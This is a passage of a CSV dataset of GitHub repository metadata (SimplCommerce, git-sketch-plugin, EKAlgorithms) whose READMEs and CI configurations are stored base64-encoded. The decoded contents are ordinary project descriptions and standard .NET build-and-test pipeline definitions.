name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
ZHRoPTg5MCI+PC9hPgoKIyMgU3BvbnNvcnMKCkJlY29tZSBhIHNwb25zb3Ig
YW5kIGdldCB5b3VyIGxvZ28gb24gb3VyIFJFQURNRSBvbiBHaXRodWIgd2l0
aCBhIGxpbmsgdG8geW91ciBzaXRlLiBbW0JlY29tZSBhIHNwb25zb3JdKGh0
dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Ujc3BvbnNv
cildCgo8YSBocmVmPSJodHRwczovL29wZW5jb2xsZWN0aXZlLmNvbS9zaW1w
bGNvbW1lcmNlL3Nwb25zb3IvMC93ZWJzaXRlIiB0YXJnZXQ9Il9ibGFuayI+
PGltZyBzcmM9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29t
bWVyY2Uvc3BvbnNvci8wL2F2YXRhci5zdmciPjwvYT4KPGEgaHJlZj0iaHR0
cHM6Ly9vcGVuY29sbGVjdGl2ZS5jb20vc2ltcGxjb21tZXJjZS9zcG9uc29y
LzEvd2Vic2l0ZSIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczov
L29wZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL3Nwb25zb3IvMS9h
dmF0YXIuc3ZnIj48L2E+CjxhIGhyZWY9Imh0dHBzOi8vb3BlbmNvbGxlY3Rp
dmUuY29tL3NpbXBsY29tbWVyY2Uvc3BvbnNvci8yL3dlYnNpdGUiIHRhcmdl
dD0iX2JsYW5rIj48aW1nIHNyYz0iaHR0cHM6Ly9vcGVuY29sbGVjdGl2ZS5j
b20vc2ltcGxjb21tZXJjZS9zcG9uc29yLzIvYXZhdGFyLnN2ZyI+PC9hPgo8
YSBocmVmPSJodHRwczovL29wZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1l
cmNlL3Nwb25zb3IvMy93ZWJzaXRlIiB0YXJnZXQ9Il9ibGFuayI+PGltZyBz
cmM9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Uv
c3BvbnNvci8zL2F2YXRhci5zdmciPjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9v
cGVuY29sbGVjdGl2ZS5jb20vc2ltcGxjb21tZXJjZS9zcG9uc29yLzQvd2Vi
c2l0ZSIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczovL29wZW5j
b2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL3Nwb25zb3IvNC9hdmF0YXIu
c3ZnIj48L2E+CgojIyBMaWNlbnNlCgpTaW1wbENvbW1lcmNlIGlzIGxpY2Vu
c2VkIHVuZGVyIHRoZSBBcGFjaGUgMi4wIGxpY2Vuc2UuCg==
",,"bGFuZ3VhZ2U6IGNzaGFycApzb2x1dGlvbjogU2ltcGxDb21tZXJjZS5zbG4K
c3VkbzogcmVxdWlyZWQKZGlzdDogeGVuaWFsCmRvdG5ldDogMy4wLjEwMApt
b25vOiBub25lCm9zOgogIC0gbGludXgKCmJyYW5jaGVzOgogIG9ubHk6CiAg
ICAtIG1hc3RlcgoKbm90aWZpY2F0aW9uczoKICBlbWFpbDoKICAgIG9uX3N1
Y2Nlc3M6IGNoYW5nZQogICAgb25fZmFpbHVyZTogYWx3YXlzCgpiZWZvcmVf
c2NyaXB0OgogIC0gZG90bmV0IHJlc3RvcmUKCnNjcmlwdDoKICAtIGRvdG5l
dCBidWlsZCAuL1NpbXBsQ29tbWVyY2Uuc2xuCiAgLSAuL3J1bi10ZXN0cy5z
aAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"IyBBU1AuTkVUIENvcmUKIyBCdWlsZCBhbmQgdGVzdCBBU1AuTkVUIENvcmUg
cHJvamVjdHMgdGFyZ2V0aW5nIC5ORVQgQ29yZS4KIyBBZGQgc3RlcHMgdGhh
dCBydW4gdGVzdHMsIGNyZWF0ZSBhIE51R2V0IHBhY2thZ2UsIGRlcGxveSwg
YW5kIG1vcmU6CiMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vYXp1cmUv
ZGV2b3BzL3BpcGVsaW5lcy9sYW5ndWFnZXMvZG90bmV0LWNvcmUKCnRyaWdn
ZXI6Ci0gbWFzdGVyCgp2YXJpYWJsZXM6CiAgbmV0Q29yZVNka1ZlcnNpb246
ICczLjAuMTAwJwoKam9iczoKLSBqb2I6IExpbnV4CiAgcG9vbDoKICAgIHZt
SW1hZ2U6ICdVYnVudHUgMTYuMDQnCiAgc3RlcHM6CiAgLSB0YXNrOiBEb3RO
ZXRDb3JlSW5zdGFsbGVyQDAKICAgIGlucHV0czoKICAgICAgcGFja2FnZVR5
cGU6ICdzZGsnCiAgICAgIHZlcnNpb246ICQobmV0Q29yZVNka1ZlcnNpb24p
CiAgLSBzY3JpcHQ6IGRvdG5ldCBidWlsZCAuL1NpbXBsQ29tbWVyY2Uuc2xu
CiAgICBkaXNwbGF5TmFtZTogJ2RvdG5ldCBidWlsZCcKICAtIHNjcmlwdDog
Li9ydW4tdGVzdHMuc2gKICAgIGRpc3BsYXlOYW1lOiAncnVuIHRlc3RzJwog
IC0gdGFzazogUHVibGlzaFRlc3RSZXN1bHRzQDIKICAgIGRpc3BsYXlOYW1l
OiAnUHVibGlzaCBUZXN0IFJlc3VsdHMgKiovKi50cngnCiAgICBjb25kaXRp
b246IHN1Y2NlZWRlZE9yRmFpbGVkKCkKICAgIGlucHV0czoKICAgICAgdGVz
dFJlc3VsdHNGb3JtYXQ6IFZTVGVzdAogICAgICB0ZXN0UmVzdWx0c0ZpbGVz
OiAnKiovKi50cngnIAoKLSBqb2I6IG1hY09TCiAgcG9vbDoKICAgIHZtSW1h
Z2U6ICdtYWNPUy0xMC4xMycKICBzdGVwczoKICAtIHRhc2s6IERvdE5ldENv
cmVJbnN0YWxsZXJAMAogICAgaW5wdXRzOgogICAgICBwYWNrYWdlVHlwZTog
J3NkaycKICAgICAgdmVyc2lvbjogJChuZXRDb3JlU2RrVmVyc2lvbikKICAt
IHNjcmlwdDogZG90bmV0IGJ1aWxkIC4vU2ltcGxDb21tZXJjZS5zbG4KICAg
IGRpc3BsYXlOYW1lOiAnZG90bmV0IGJ1aWxkJwogIC0gc2NyaXB0OiAuL3J1
bi10ZXN0cy5zaAogICAgZGlzcGxheU5hbWU6ICdydW4gdGVzdHMnCiAgLSB0
YXNrOiBQdWJsaXNoVGVzdFJlc3VsdHNAMgogICAgZGlzcGxheU5hbWU6ICdQ
dWJsaXNoIFRlc3QgUmVzdWx0cyAqKi8qLnRyeCcKICAgIGNvbmRpdGlvbjog
c3VjY2VlZGVkT3JGYWlsZWQoKQogICAgaW5wdXRzOgogICAgICB0ZXN0UmVz
dWx0c0Zvcm1hdDogVlNUZXN0CiAgICAgIHRlc3RSZXN1bHRzRmlsZXM6ICcq
Ki8qLnRyeCcgCgotIGpvYjogV2luZG93cwogIHBvb2w6CiAgICB2bUltYWdl
OiAnd2luZG93cy0yMDE5JwogIHN0ZXBzOgogIC0gdGFzazogRG90TmV0Q29y
ZUluc3RhbGxlckAwCiAgICBpbnB1dHM6CiAgICAgIHBhY2thZ2VUeXBlOiAn
c2RrJwogICAgICB2ZXJzaW9uOiAkKG5ldENvcmVTZGtWZXJzaW9uKQogIC0g
c2NyaXB0OiBkb3RuZXQgYnVpbGQgLi9TaW1wbENvbW1lcmNlLnNsbgogICAg
ZGlzcGxheU5hbWU6ICdkb3RuZXQgYnVpbGQnCiAgLSB0YXNrOiBQb3dlclNo
ZWxsQDIKICAgIGlucHV0czoKICAgICAgZmlsZVBhdGg6IC5ccnVuLXRlc3Rz
LnBzMQogICAgZGlzcGxheU5hbWU6ICdydW4gdGVzdHMnCiAgLSB0YXNrOiBQ
dWJsaXNoVGVzdFJlc3VsdHNAMgogICAgZGlzcGxheU5hbWU6ICdQdWJsaXNo
IFRlc3QgUmVzdWx0cyAqKi8qLnRyeCcKICAgIGNvbmRpdGlvbjogc3VjY2Vl
ZGVkT3JGYWlsZWQoKQogICAgaW5wdXRzOgogICAgICB0ZXN0UmVzdWx0c0Zv
cm1hdDogVlNUZXN0CiAgICAgIHRlc3RSZXN1bHRzRmlsZXM6ICcqKi8qLnRy
eCcgCgotIGpvYjogTGludXhSZWxlYXNlCiAgcG9vbDoKICAgIHZtSW1hZ2U6
ICdVYnVudHUgMTYuMDQnCiAgdmFyaWFibGVzOgogICAgYnVpbGRDb25maWd1
cmF0aW9uOiAnUmVsZWFzZScKICBzdGVwczoKICAtIHRhc2s6IERvdE5ldENv
cmVJbnN0YWxsZXJAMAogICAgaW5wdXRzOgogICAgICBwYWNrYWdlVHlwZTog
J3NkaycKICAgICAgdmVyc2lvbjogJChuZXRDb3JlU2RrVmVyc2lvbikKICAt
IHNjcmlwdDogZG90bmV0IGJ1aWxkIC0tY29uZmlndXJhdGlvbiAkKGJ1aWxk
Q29uZmlndXJhdGlvbikKICAgIGRpc3BsYXlOYW1lOiAnZG90bmV0IGJ1aWxk
ICQoYnVpbGRDb25maWd1cmF0aW9uKScKICAtIHNjcmlwdDogLi9ydW4tdGVz
dHMuc2gKICAgIGRpc3BsYXlOYW1lOiAncnVuIHRlc3RzJyAgICAKICAtIHRh
c2s6IFB1Ymxpc2hUZXN0UmVzdWx0c0AyCiAgICBkaXNwbGF5TmFtZTogJ1B1
Ymxpc2ggVGVzdCBSZXN1bHRzICoqLyoudHJ4JwogICAgY29uZGl0aW9uOiBz
dWNjZWVkZWRPckZhaWxlZCgpCiAgICBpbnB1dHM6CiAgICAgIHRlc3RSZXN1
bHRzRm9ybWF0OiBWU1Rlc3QKICAgICAgdGVzdFJlc3VsdHNGaWxlczogJyoq
LyoudHJ4JyAK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'git-sketch-plugin',50212606,b':gem::octocat: A Git client generating pretty diffs built right into Sketch.',b'JavaScript',47,2400,,2400,False,b'https://api.github.com/repos/mathieudutour/git-sketch-plugin/forks',"IyMgVGhpcyBwbHVnaW4gd2FzIGEgZmlyc3QgYXR0ZW1wdCB0byBicmluZyB2
ZXJzaW9uIGNvbnRyb2wgYW5kIGNvbGxhYm9yYXRpb24gdG8gZGVzaWduZXJz
LiBTaW5jZSB0aGVuLCBTa2V0Y2ggZXZvbHZlZCBhIGxvdCBhbmQgbXkgbmV3
IHByb2plY3QgdGFrZXMgYWR2YW50YWdlcyBvZiB0aGVtIHRvIHVubG9jayBf
dHJ1ZV8gdmVyc2lvbiBjb250cm9sLiBDaGVjayBpdCBvdXQ6IFtodHRwOi8v
a2FjdHVzLmlvXShodHRwOi8va2FjdHVzLmlvKQoKLS0tCgoKPGltZyBhbGln
bj0icmlnaHQiIHNyYz0ibG9nby5wbmciPgoKZ2l0LXNrZXRjaC1wbHVnaW4K
PT09PT09PT09ClshW0dpdEh1YiByZWxlYXNlXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2dpdGh1Yi9yZWxlYXNlL21hdGhpZXVkdXRvdXIvZ2l0LXNrZXRj
aC1wbHVnaW4uc3ZnP21heEFnZT0yNTkyMDAwKV0oaHR0cHM6Ly9naXRodWIu
Y29tL21hdGhpZXVkdXRvdXIvZ2l0LXNrZXRjaC1wbHVnaW4vcmVsZWFzZXMp
IApbIVtHaXRIdWIgcmVsZWFzZV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9i
YWRnZS9Xb3JrcyUyMHdpdGgtU2tldGNoJTIwUnVubmVyLWJsdWUuc3ZnP2Nv
bG9yQj0zMDhBREYpXShodHRwOi8vYml0Lmx5L1NrZXRjaFJ1bm5lcldlYnNp
dGUpCgogQSBHaXQgY2xpZW50IGJ1aWx0IHJpZ2h0IGludG8gW1NrZXRjaF0o
aHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoKS4gR2VuZXJh
dGUgW3ByZXR0eSBkaWZmc10oaHR0cHM6Ly9naXRodWIuY29tL21hdGhpZXVk
dXRvdXIvZ2l0LXNrZXRjaC1wbHVnaW4vcHVsbC8xL2ZpbGVzKSBzbyB0aGF0
IGV2ZXJ5Ym9keSBrbm93cyB3aGF0IGFyZSB0aGUgY2hhbmdlcyEKCkZyb20g
Li4uCiFbVWdseV0oZXhhbXBsZS9TY3JlZW5TaG90QmFkLnBuZykKCgouLi4g
VG8KIVtQcmV0dHldKGV4YW1wbGUvU2NyZWVuU2hvdE5pY2UucG5nKQoKIVtz
Y3JlZW4gY2FzdF0oZXhhbXBsZS9TY3JlZW5DYXN0LmdpZikKCiMjIFJlcXVp
cmVtZW50cwoqIFtTa2V0Y2hdKGh0dHA6Ly9za2V0Y2hhcHAuY29tLykgPj0g
My40ICgqKm5vdCoqIHdpdGggdGhlIHNhbmRib3hlZCB2ZXJzaW9uIGllIGZy
b20gdGhlIEFwcCBTdG9yZSkuCiogW0dpdF0oaHR0cHM6Ly9naXQtc2NtLmNv
bS8pIChjb21pbmcgd2l0aCBPUyBYIHNvIHlvdSBzaG91bGRuJ3QgaGF2ZSB0
byBkbyBhbnl0aGluZykKKiBbWGNvZGUgQ29tbWFuZCBMaW5lIFRvb2xzXSho
dHRwOi8vb3N4ZGFpbHkuY29tLzIwMTQvMDIvMTIvaW5zdGFsbC1jb21tYW5k
LWxpbmUtdG9vbHMtbWFjLW9zLXgvKQoKIyMgSW5zdGFsbGF0aW9uCgojIyMg
RnJvbSBhIHJlbGVhc2UgKHNpbXBsZXN0KQoKKiBbRG93bmxvYWRdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9tYXRoaWV1ZHV0b3VyL2dpdC1za2V0Y2gtcGx1Z2lu
L3JlbGVhc2VzL2xhdGVzdCkgdGhlIGxhdGVzdCByZWxlYXNlIG9mIHRoZSBw
bHVnaW4KKiBVbi16aXAKKiBEb3VibGUtY2xpY2sgb24gR2l0LnNrZXRjaHBs
dWdpbgoKIyMjIEZyb20gdGhlIHNvdXJjZXMKCiogQ2xvbmUgdGhlIHJlcG8K
KiBJbnN0YWxsIHRoZSBkZXBlbmRlbmNpZXMgKGBucG0gaW5zdGFsbGApCiog
QnVpbGQgKGBucG0gcnVuIGJ1aWxkYCkKKiBEb3VibGUtY2xpY2sgb24gR2l0
LnNrZXRjaHBsdWdpbgoKIyMgRG9jdW1lbnRhdGlvbgpGb3IgYSBHZXR0aW5n
IHN0YXJ0ZWQgZ3VpZGUsIEZBUSwgZXRjLiBjaGVjayBvdXQgb3VyIFtkb2Nz
XShodHRwczovL2dpdGh1Yi5jb20vbWF0aGlldWR1dG91ci9naXQtc2tldGNo
LXBsdWdpbi90cmVlL21hc3Rlci9kb2NzKSEKCiMjIFdhbnQgdG8gY29udHJp
YnV0ZT8KCkFueW9uZSBjYW4gaGVscCBtYWtlIHRoaXMgcHJvamVjdCBiZXR0
ZXIgLSBjaGVjayBvdXQgb3VyIFtDb250cmlidXRpbmcgZ3VpZGVdKC9DT05U
UklCVVRJTkcubWQpIQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'EKAlgorithms',12034693,b'EKAlgorithms contains some well known CS algorithms & data structures.',b'Objective-C',6,2399,,2399,False,b'https://api.github.com/repos/EvgenyKarkan/EKAlgorithms/forks',"WyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5vcmcvRXZnZW55
S2Fya2FuL0VLQWxnb3JpdGhtcy5zdmcpXShodHRwczovL3RyYXZpcy1jaS5v
cmcvRXZnZW55S2Fya2FuL0VLQWxnb3JpdGhtcykKCkVLQWxnb3JpdGhtcwo9
PT09PT09PT09PT0KCkVLQWxnb3JpdGhtcyBpcyBhIHNldCBvZiBjb21wdXRl
ciBleGVyY2lzZXMgaW1wbGVtZW50ZWQgaW4gT2JqZWN0aXZlLUMuIApEYXRh
IHN0cnVjdHVyZXMsIHdlbGwga25vd24gYWxnb3JpdGhtcywgQ1MgY3VyaW9z
aXRpZXMsIHlvdSBuYW1lIGl0IQoKRG9uJ3QgZm9yZ2V0IHRvICp3YXRjaCog
dGhlIHJlcG9zaXRvcnk7IEl0cyBjb250ZW50IHdpbGwgYmUgZXhwYW5kZWQg
YW5kIHVwZGF0ZWQgZnJlcXVlbnRseS4KCkFycmF5cyBhbmQgTGlzdHMKLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQogCjEuIEluZGV4IG9mIG1heGltdW0gZWxl
bWVudCBpbiBhcnJheS4KMi4gSW5kZXhlcyBvZiBtYXhpbXVtIGFuZCBtaW5p
bXVtIGVsZW1lbnRzIHNpbXVsdGFuZW91c2x5LgozLiBGaW5kIGxvbmdlc3Qg
c3RyaW5nIGluIGFycmF5IG9mIHN0cmluZ3MuIAo0LiBGaW5kIHNob3J0ZXN0
IHN0cmluZyBpbiBhcnJheSBvZiBzdHJpbmdzLgo1LiBBcnJheSByZXZlcnNl
Lgo2LiBJbnRlcnNlY3Rpb24gb2YgdHdvIGFycmF5cy4KNy4gVW5pb24gb2Yg
dHdvIGFycmF5cyAod2l0aCByZW1vdmUgZHVwbGljYXRlcykuCjguIFVuaW9u
IG9mIHR3byBhcnJheXMgKHdpdGggcmVtb3ZlIGR1cGxpY2F0ZXMpIGZvciBz
b21lIGtleS4KOS4gRmluZCBkdXBsaWNhdGVzLgoxMC4gQXJyYXkgd2l0aCBO
IHVuaXF1ZS9ub3QgdW5pcXVlIHJhbmRvbSBvYmplY3RzLgoxMS4gQ2hlY2sg
aWYgYXJyYXkgaXMgc29ydGVkLgoxMi4gQXJyYXkgc2h1ZmZsZSAoRmlzaGVy
LVlhdGVzKS4KMTMuIFN1bSBvZiBhcnJheSBlbGVtZW50cy4KMTQuIE4gb2Yg
b2NjdXJlbmNlcyBvZiBlYWNoIGVsZW1lbnQgaW4gYXJyYXkuCgpTZWFyY2gg
QWxnb3JpdGhtcwotLS0tLS0tLS0tLS0tLS0tLQoxLiBMaW5lYXIgc2VhcmNo
LgoyLiBCaW5hcnkgc2VhcmNoLgoKU29ydGluZyBBbGdvcml0aG1zCi0tLS0t
LS0tLS0tLS0tLS0tLQoxLiBCdWJibGUgc29ydC4KMi4gU2hlbGwgc29ydC4K
My4gTWVyZ2Ugc29ydC4gIAo0LiBRdWljayBzb3J0LiAgCjUuIEluc2VydGlv
biBzb3J0Lgo2LiBTZWxlY3Rpb24gc29ydC4KNy4gUmFkaXggU29ydC4KOC4g
UGFydGlhbCBzZWxlY3Rpb24gc29ydC4KOS4gSGVhcCBzb3J0LgoKU2VsZWN0
aW9uIEFsZ29yaXRobXMKLS0tLS0tLS0tLS0tLS0tLS0tLS0KMS4gUXVpY2tz
ZWxlY3QuCgpTdHJpbmdzCi0tLS0tLS0KMS4gUGFsaW5kcm9tZSBvciBub3Qu
CjIuIFN0cmluZyByZXZlcnNlLgozLiBXb3JkcyBjb3VudC4KNC4gUGVybXV0
YXRpb25zIG9mIHN0cmluZy4gCjUuIE9jY3VycmVuY2VzIG9mIGVhY2ggY2hh
cmFjdGVyIChhIC0geikuCjYuIENvdW50ICJuZWVkbGVzIiBpbiBhICJoYXlz
dGFjayIuCjcuIFJhbmRvbSBzdHJpbmcuCjguIENvbmNhdGVuYXRpb24gb2Yg
dHdvIHN0cmluZ3MuCjkuIEZpbmQgMXN0IG9jY3VycmVuY2Ugb2YgIm5lZWRs
ZSIgaW4gYSAiaGF5c3RhY2siLgoxMC4gTGFzdCBvY2N1cnJlbmNlIG9mICJu
ZWVkbGUiIGluIGEgImhheXN0YWNrIi4KMTEuIExvbmdlc3QgY29tbW9uIHN1
YnNlcXVlbmNlLgoxMi4gTGV2ZW5zaHRlaW4gZGlzdGFuY2UuCjEzLiBLTVAg
KEtudXRo4oCTTW9ycmlz4oCTUHJhdHQpLgoxNC4gQm95ZXLigJNNb29yZSBz
dHJpbmcgc2VhcmNoIGFsZ29yaXRobS4KCk51bWVyaWMgQWxnb3JpdGhtcwot
LS0tLS0tLS0tLS0tLS0tLS0KMS4gU2lldmUgb2YgRXJhdG9zdGhlbmVzLgoy
LiBHcmVhdCBjb21tb24gZGl2aXNvciAoR0NEKS4KMy4gTGVhc3QgY29tbW9u
IG11bHRpcGxlIChMQ00pLgo0LiBGYWN0b3JpYWwuCjUuIEZpYm9uYWNjaSBu
dW1iZXJzICg1IGFsZ29zKS4KNi4gU3VtIG9mIGRpZ2l0cy4KNy4gQmluYXJ5
IHRvIGRlY2ltYWwgY29udmVyc2lvbi4KOC4gRGVjaW1hbCB0byBiaW5hcnkg
Y29udmVyc2lvbi4KOS4gRmFzdCBleHBvbmVudGlhdGlvbi4KMTAuIE51bWJl
ciByZXZlcnNlLgoxMS4gRXZlbi9vZGQgY2hlY2suCjEyLiBMZWFwIHllYXIg
Y2hlY2suCjEzLiBBcm1zdHJvbmcgbnVtYmVyIGNoZWNrLgoxNC4gUHJpbWUg
bnVtYmVyIGNoZWNrLgoxNS4gRmluZCBOdGggcHJpbWUuCjE2LiBTd2FwIHRo
ZSB2YWx1ZSBvZiB0d28gTlNJbnRlZ2VyIHBvaW50ZXJzLgoxNy4gU3F1YXJl
IHJvb3QgdXNpbmcgTmV3dG9uLVJhcGhzb24gbWV0aG9kLgoxOC4gQ29udmVy
dCBpbnRlZ2VyIHRvIGFub3RoZXIgbnVtZXJhbCBzeXN0ZW0gKDIsIDgsIDEy
LCAxNikuICAKMTkuIEZhc3QgaW52ZXJzZSBzcXVhcmUgcm9vdC4KCkRhdGEg
U3RydWN0dXJlcwotLS0tLS0tLS0tLS0tLS0KMS4gU3RhY2sgKExJRk8pLgoy
LiBRdWV1ZSAoRklGTykuCjMuIERlcXVlLgo0LiBMaW5rZWQgbGlzdC4KNS4g
R3JhcGg6IAogICAgLSBERlMgKGRlcHRoLWZpcnN0IHNlYXJjaCk7CiAgICAt
IEJGUyAoYnJlYWR0aC1maXJzdCBzZWFyY2gpOwogICAgLSBNU1QgKG1pbmlt
dW0gc3Bhbm5pbmcgdHJlZSAtIFByaW0ncyBhbGdvcml0aG0pOwogICAgLSBN
U1QgKG1pbmltdW0gc3Bhbm5pbmcgdHJlZSAtIEtydXNrYWwncyBhbGdvcml0
aG0pOwogICAgLSBTaG9ydGVzdCBwYXRoIChEaWprc3RyYSdzIGFsZ29yaXRo
bSk7CiAgICAtIFRvcHNvcnQuCjYuIFRyZWUuICAKNy4gQmluYXJ5IHRyZWU6
ICAKICAgIC0gUHJlLW9yZGVyIHRyYXZlcnNhbDsKICAgIC0gSW4tb3JkZXIg
dHJhdmVyc2FsOwogICAgLSBQb3N0LW9yZGVyIHRyYXZlcnNhbC4KOC4gQmlu
YXJ5IHNlYXJjaCB0cmVlIChCU1QpLiAgCjkuIEFWTCB0cmVlLgoxMC4gQmlu
YXJ5IGhlYXAuCgpQcm9ibGVtcwotLS0tLS0tLQoxLiBKb3NlcGh1cyBQcm9i
bGVtLgoyLiBNb2R1bG8gYmlhcy4KCkdlb21ldHJ5Ci0tLS0tLS0tCjEuIEFy
cmF5IG9mIHNvcnRlZCBsb2NhdGlvbnMgYWNjb3JkaW5nIHRvIGEgZGlzdGFu
Y2UgdG8gYSBnaXZlbiBsb2NhdGlvbi4gIAoyLiBDYXJ0ZXNpYW4gcXVhZHJh
bnQgc2VsZWN0aW9uIGFsZ29yaXRobXMKClJlY3Vyc2lvbiAgCi0tLS0tLS0t
LQoxLiBUb3dlciBvZiBIYW5vaS4KCkNvbnRyaWJ1dGlvbnMKLS0tLS0tLS0t
LS0tLSAgIApQdWxsIHJlcXVlc3RzIGFyZSB3ZWxjb21lISBCdXQgaWYgeW91
IHdhbnQgdG8gZG8gYSBjb250cmlidXRpb24sIG9wZW4gYW4gaXNzdWUgZmly
c3QuCgpPcmlnaW5hbGx5LCB0aGUgY29tcGlsZWQgZXhlcmNpc2VzIGFyZSBm
b3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMgb25seSBhbmQgaGF2ZSBubyBpbnRl
bnRpb24gb2YgYmVpbmcgdGhlIHVsdGltYXRlIHNvbHV0aW9uIGNvbXBsZXhp
dHktd2lzZSwgYnV0IHRoZXkgZG8gaW50ZW5kIHRvIGJlIHVzZWQgYnkgeW91
IGFzIGEgc3RhcnRpbmcgcG9pbnQgb2YgYSBkZWVwZXIgc3R1ZHkgb24gYWxn
b3JpdGhtcyBhbmQgdGhlaXIgb3B0aW1pemF0aW9uLiAKCkltcG9ydGFudCBO
b3RlCi0tLS0tLS0tLS0tLS0tClRoZSBGb3VuZGF0aW9uIGZyYW1ld29yayBh
bHJlYWR5IGluY2x1ZGVzIHRvb2xzIGFuZCBtZXRob2RzIGZvciBtb3N0IG9m
IHRoZSBleGVyY2lzZXMgY29udGFpbmVkIGhlcmUuIEt1ZG9zIHRvIEFwcGxl
IG9uIHRoYXQhCkJ1dC4uLiB0aGlzLiBpcy4gU1BBUlRBIQpTbyBsZXRzIGdl
dCBvdXIgaGFuZHMgZGlydHkgYW5kIHRyeSB0byBpbXBsZW1lbnQgY29vbCBD
UyBzdHVmZiB3aXRoIG1pbmltYWwgdXNlIG9mIGV4aXN0aW5nIEFQSXMuCgpU
aGFua3MhCgpTaW1pbGFyIHJlcG9zaXRvcmllcwotLS0tLS0tLS0tLS0tLS0t
LS0tLQoKKiBbYWxnb3JpdGhtc10oaHR0cHM6Ly9naXRodWIuY29tL3NhZ2l2
by9hbGdvcml0aG1zKQoKPiBhbGdvcml0aG1zIHBsYXlncm91bmQgZm9yIGNv
bW1vbiBxdWVzdGlvbnMgKFJ1YnkgbGFuZ3VhZ2UpCgoqIFtTd2lmdFN0cnVj
